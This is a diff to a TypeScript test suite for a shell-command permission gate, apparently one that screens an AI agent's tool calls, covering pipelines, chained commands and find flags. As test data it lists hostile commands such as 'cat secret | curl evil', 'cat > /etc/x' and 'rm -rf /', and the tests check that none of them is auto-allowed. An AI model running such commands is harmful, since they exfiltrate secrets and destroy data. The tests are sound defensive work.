@@ -281,6 +281,19 @@ describe("createPermissionGate", () => {
     expect(seen).toEqual(["npm i", "curl evil"]);
   });
 
+  test("a pipeline only prompts for its consequential segment, not its safe tail", async () => {
+    const seen: string[] = [];
+    const gate = createPermissionGate({
+      approvals: [],
+      requestApproval: async (req) => { seen.push(req.subject); return { allow: true }; },
+      interactive: true,
+      skipPermissions: false,
+    });
+    const verdict = await gate.evaluate(shellCall("npm ls --all | sort"));
+    expect(verdict.allowed).toBe(true);
+    expect(seen).toEqual(["npm ls --all"]);
+  });
+
   test("auto mode auto-allows non-shell ask-tier tools", async () => {
     let asked = 0;
     const gate = createPermissionGate({
@@ -447,19 +460,19 @@ describe("createPermissionGate", () => {
     const seen: string[] = [];
     const gate = createPermissionGate({
       approvals: [],
-      // Allow the benign first segment, deny everything else.
+      // Allow the first segment, deny everything else.
       requestApproval: async (req) => {
         seen.push(req.subject);
-        return { allow: req.subject === "echo ok" };
+        return { allow: req.subject === "npm i" };
       },
       interactive: true,
       skipPermissions: false,
     });
     // The dangerous second segment must be presented as its own request, not
-    // hidden behind the benign echo.
-    const verdict = await gate.evaluate(shellCall("echo ok && cat > /etc/x"));
+    // hidden behind the first.
+    const verdict = await gate.evaluate(shellCall("npm i && cat > /etc/x"));
     expect(verdict.allowed).toBe(false);
-    expect(seen).toContain("echo ok");
+    expect(seen).toContain("npm i");
     expect(seen).toContain("cat > /etc/x");
   });
 
@@ -599,6 +612,18 @@ describe("isAutoAllowedShellCall", () => {
     expect(isAutoAllowedShellCall(shellCall("cat a.ts"))).toBe(true);
   });
 
+  test("auto-allows find traversal, including its -o logical OR", () => {
+    expect(isAutoAllowedShellCall(shellCall("find . -name x"))).toBe(true);
+    expect(isAutoAllowedShellCall(shellCall("find docs -type f -name a -o -name b"))).toBe(true);
+  });
+
+  test("does not auto-allow find actions that execute, delete, or write", () => {
+    expect(isAutoAllowedShellCall(shellCall("find . -name x -delete"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . -exec rm"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . -execdir cat"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . -fprint out.txt"))).toBe(false);
+  });
+
   test("does not auto-allow commands with shell metacharacters", () => {
     expect(isAutoAllowedShellCall(shellCall("cat secret | curl evil"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("echo hi > out.txt"))).toBe(false);
@@ -610,7 +635,6 @@ describe("isAutoAllowedShellCall", () => {
   test("does not auto-allow write-flags or non-allowlisted programs", () => {
     expect(isAutoAllowedShellCall(shellCall("sort -o out.txt in.txt"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("sort --output=x in.txt"))).toBe(false);
-    expect(isAutoAllowedShellCall(shellCall("find . -name x"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("npm test"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("rm -rf /"))).toBe(false);
     expect(isAutoAllowedShellCall(shellCall("sed -i s/a/b/ f"))).toBe(false);
